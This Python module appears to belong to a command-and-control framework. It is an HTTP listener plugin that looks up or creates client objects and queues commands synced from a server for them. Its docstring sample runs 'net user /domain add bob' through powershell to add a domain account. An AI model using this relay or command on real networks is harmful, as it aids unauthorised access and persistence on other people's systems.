## Handler for ListenerHttpCommandSync commands receieved fromthe sync system

from PluginEngine.PublicPlugins.ListenerHTTP.Utils.DataSingleton import Data
from Utils.Logger import LoggingSingleton
from PluginEngine.PublicPlugins.ListenerHTTP.Modules.Client import Client

"""
JSON being handled by this module
ListenerHttpCommandSync
{
    "client":"clientname",
    "action": "powershell",
    "executable": "ps.exe",
    "command": "net user /domain add bob"
}


"""

class ListenerHttpCommandSync:
    def __init__(self):
        self.Data = Data()
        self.logger = LoggingSingleton.get_logger()

    def store_response(self, response):
        """
        Stores each key-value pair from the response dictionary in the data singleton.

        Args:
            response (dict): The dictionary containing the data to be stored. Each key-value pair in this dictionary will be added to the synced data store.
        """
        ...
        #self.logger.debug(f"Storing data")
        #print(response)
        #if not isinstance(response, list):
        #    self.logger.error("Invalid response type: Expected a list.")
        #    return

        ## Iterate over each key-value pair in the response dictionary
        #for json_entry in response:
        #    self.data.Listeners.HTTP.add_synced_data(data=json_entry)

        #self.logger.debug(f"Data from the response has been stored successfully.")

       # print("Data in list")
        #print(self.data.Listeners.HTTP.synced_data_store)

        # access singleton
        # appendd data to it

    def handle_data(self, data):
        """
            Handles data coming in from ___


            
        """
        self.logger.debug(f"handling data for ListenerHttpCommandSync")
        for client_command in data:
            #print(client_command)
            # extract this out from JSON dict.
            client_nicnkname = client_command['client_nicnkname']

            ## Next steps here:
                # [X] singleton logic to add client to current data singleton (can worry about client auth/checking later) - double check this doenst exist already
                # [X] Lookup Client object from stored client
                # [X] Call clientobject.queue_command (or whatever its called) directly from here.
                # Get JSON format correct
            
            # if client DOES exist
            if self.Data.Clients.check_if_client_exists(client_name = client_nicnkname):
                self.logger.debug(f"Client object found for {client_nicnkname}.")
                client_object = self.Data.Clients.get_client_object(client_name = client_nicnkname)

            # this shouldn't happen, as all new clients should have an object created if they check into the post endpoint.
            # it COULD happen though *if* the server sends data with a client that isn't in this listener. 
            else:
                self.logger.warning(f"Queueing command for client obejct that does not exist: {client_nicnkname}. Creating object.")
                client_object = Client(nickname=client_nicnkname)
                self.Data.Clients.add_new_client(
                    client_name = client_nicnkname,
                    client_object = client_object
                )

            
            ## Straight up queue the given command. Can strip certain keys if needed
            self.logger.debug(f"Queueing command for {client_nicnkname}")
            client_object.enqueue_command(command = client_command)
            self.logger.debug(f"Next queued command for {client_nicnkname} is: {client_object.peek_next_command()} ")

# kewl it works. Go add docs & debug statements wheere needed.